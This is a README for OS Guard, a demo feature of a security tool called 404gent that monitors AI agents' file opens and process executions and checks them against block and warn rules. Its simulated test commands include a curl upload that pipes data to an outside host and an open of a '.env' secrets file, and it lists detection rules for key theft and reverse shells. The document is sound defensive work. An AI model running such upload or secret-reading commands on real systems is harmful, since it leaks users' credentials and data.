# OS Guard Demo MVP

OS Guard adds a fourth event surface for file and process behavior that would normally sit below shell wrappers. This branch implements the demo path only: simulated OS events flow through the same policy, audit, state, cmux, and quarantine pipeline as prompt, command, and output events.

Native follow-up work adds a Swift EndpointSecurity daemon in NOTIFY mode. It observes real `NOTIFY_OPEN` and `NOTIFY_EXEC` events, but still does not deny real `AUTH_OPEN` or `AUTH_EXEC` events.

## Commands

```bash
node src/cli.js os-guard status
node src/cli.js os-guard simulate-open .env --agent demo --pid 1234
node src/cli.js os-guard simulate-exec curl https://example.com/upload -d @- --agent demo --pid 1234
node src/cli.js agent --name demo --with-os-guard -- node -e 'console.log("done")'
node src/cli.js server
npm run demo:os-guard
```

## Event Shape

The adapter keeps structured metadata and also emits normalized text for the existing rule engine.

```text
os open path=.env pid=1234 agent=demo mode=simulate
os exec argv="curl https://example.com/upload -d @-" pid=1234 agent=demo mode=simulate
```

Reports keep metadata under `event.meta`, including `operation`, `path`, `argv`, `agent`, `pid`, and `mode`.

## Native NOTIFY Mode

Start the Node policy server:

```bash
node src/cli.js server
```

Build and run the Swift daemon from `daemon/es-daemon` with the PID you want to watch:

```bash
DEVELOPER_DIR=/Applications/Xcode-16.2.0.app/Contents/Developer swift build
sudo FOURGENT_WATCH_PIDS=1234 .build/debug/es-daemon
```

The daemon posts observed OS events to `http://127.0.0.1:7404/os-event` by default. Override the endpoint when needed:

```bash
sudo FOURGENT_POLICY_ENDPOINT=http://127.0.0.1:7404 FOURGENT_WATCH_PIDS=1234 .build/debug/es-daemon
```

When the watched process opens `.env` or executes a network tool like `curl`, 404gent evaluates the event with the existing OS rules and writes the result through audit/state/cmux.

## Current Coverage

- Sensitive file open attempts block by default.
- Private key and certificate file open attempts block by default.
- Network transfer executable launches warn by default.
- Destructive executable launches block by default.
- Reverse-shell-like exec arguments block by default.

## Native Follow-Up

`src/integrations/os-guard.js` is the adapter boundary for native daemon events. Native NOTIFY mode is present; real blocking still needs `AUTH_OPEN`/`AUTH_EXEC`, entitlement, signing, and privileged deployment.

The Swift daemon lives under `daemon/es-daemon/`. It creates an EndpointSecurity client when run on macOS with the required privileges and posts events to the local 404gent policy server.
